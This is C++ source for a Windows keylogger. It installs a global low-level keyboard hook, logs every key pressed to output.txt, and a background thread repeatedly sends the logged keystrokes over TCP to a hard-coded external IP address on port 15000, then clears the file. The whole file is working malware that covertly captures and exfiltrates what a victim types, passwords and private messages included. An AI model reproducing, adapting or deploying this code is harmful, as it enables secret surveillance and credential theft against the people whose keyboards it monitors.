#undef UNICODE
#define UNICODE
#undef _WINSOCKAPI_
#define _WINSOCKAPI_

#include "Header.h"
#include "Windows.h"
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <iostream>
#include <fstream>
#include <chrono>
#include <ctime>
#include <iomanip>
#include <string>

#pragma warning(disable : 4996)
// Need to link with Ws2_32.lib, Mswsock.lib, and Advapi32.lib
#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")

#define DEFAULT_BUFLEN 512
#define DEFAULT_PORT "15000"

HHOOK hHook;
std::ofstream myfile;
std::string outputFile;

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    myfile.open(outputFile, std::fstream::app);

    PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)lParam;
    BOOL fEatKeystroke = FALSE;

    //case statement for checking what keyboard press
    if (nCode == HC_ACTION)
    {
        switch (wParam)
        {
        //only care about keypress
        case WM_KEYDOWN:
            //put keypress into file
            myfile << char(p->vkCode);
            break;
        case WM_SYSKEYDOWN:
            break;
        case WM_KEYUP:
            break;
        case WM_SYSKEYUP:
            break;
        }
    }

    myfile.close();
    return CallNextHookEx(hHook, nCode, wParam, lParam);
}

void initFile() {
    using namespace std;
    auto now = std::chrono::system_clock::now();
    auto t_c = std::chrono::system_clock::to_time_t(now);

    //clear the output file every program execution
    outputFile = "output.txt";
    myfile.open(outputFile);
    myfile.close();
}

WPARAM setHook(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    //set keyboard hook
    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, hInstance, 0);
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0) != 0)
    {
        //currently never hits this
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    //currently never hits this
    return msg.wParam;
}

std::ifstream::pos_type filesize(std::string filename)
{
    std::ifstream in(filename, std::ifstream::ate | std::ifstream::binary);
    return in.tellg();
}

DWORD WINAPI startClientThread( LPVOID lpParam) {
    WSADATA wsaData;
    SOCKET ConnectSocket = INVALID_SOCKET;
    struct addrinfo* result = NULL,
        * ptr = NULL,
        hints;
   // std::string sendbuf;
    char recvbuf[DEFAULT_BUFLEN];
    int iResult;
    int recvbuflen = DEFAULT_BUFLEN;
    std::string ip = "76.229.211.229";


    // Initialize Winsock
    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0) {
        printf("WSAStartup failed with error: %d\n", iResult);
    }

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    // Resolve the server address and port
    iResult = getaddrinfo(ip.c_str(), DEFAULT_PORT, &hints, &result);
    if (iResult != 0) {
        printf("getaddrinfo failed with error: %d\n", iResult);
        WSACleanup();
    }

    // Attempt to connect to an address until one succeeds
    for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {

        // Create a SOCKET for connecting to server
        ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype,
            ptr->ai_protocol);
        if (ConnectSocket == INVALID_SOCKET) {
            printf("socket failed with error: %ld\n", WSAGetLastError());
            WSACleanup();
        }

        // Connect to server.
        iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
        if (iResult == SOCKET_ERROR) {
            closesocket(ConnectSocket);
            ConnectSocket = INVALID_SOCKET;
            continue;
        }
        break;
    }

    freeaddrinfo(result);

    if (ConnectSocket == INVALID_SOCKET) {
        printf("Unable to connect to server!\n");
        WSACleanup();
    }

    while (true) {
        if (filesize(outputFile) > 1) {
            //Send an initial buffer
            std::ifstream inFile;
            inFile.open(outputFile);
            std::string sendBuf;
            std::string lineBuf;
            while (std::getline(inFile, lineBuf)) {
                sendBuf = sendBuf + lineBuf;
            }
            sendBuf = sendBuf + "\0";
            myfile.close();
            std::fstream outFile;
            outFile.open(outputFile, std::ofstream::out | std::ofstream::trunc);
            outFile.close();
            //std::string sendBuf;
            //sendBuf = "hi there!";
            iResult = send(ConnectSocket, sendBuf.c_str(), (int)strlen(sendBuf.c_str()), 0);
            if (iResult == SOCKET_ERROR) {
                printf("send failed with error: %d\n", WSAGetLastError());
                closesocket(ConnectSocket);
                WSACleanup();
            }
            printf("Bytes Sent: %ld\n", iResult);
        }
    }

    // shutdown the connection since no more data will be sent
    iResult = shutdown(ConnectSocket, SD_SEND);
    if (iResult == SOCKET_ERROR) {
        printf("shutdown failed with error: %d\n", WSAGetLastError());
        closesocket(ConnectSocket);
        WSACleanup();
    }

    // Receive until the peer closes the connection
    do {

        iResult = recv(ConnectSocket, recvbuf, recvbuflen, 0);
        if (iResult > 0)
            printf("Bytes received: %d\n", iResult);
        else if (iResult == 0)
            printf("Connection closed\n");
        else
            printf("recv failed with error: %d\n", WSAGetLastError());

    } while (iResult > 0);

    // cleanup
    closesocket(ConnectSocket);
    WSACleanup();
    
    return 0;
}


//main function (uses windows main instead of main)
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    const int numThreads = 1;
    //initialize the file to store keyboard input
    initFile();


    HANDLE  hThreadArray[numThreads];
    DWORD   dwThreadIdArray[numThreads];
    hThreadArray[0] = CreateThread(
        NULL,                   // default security attributes
        0,                      // use default stack size  
        startClientThread,       // thread function name
        NULL,          // argument to thread function 
        0,                      // use default creation flags 
        &dwThreadIdArray[0]);   // returns the thread identifier 

    //set the hook
    WPARAM result = setHook(hInstance, hPrevInstance, lpCmdLine, nCmdShow);

    return result;
}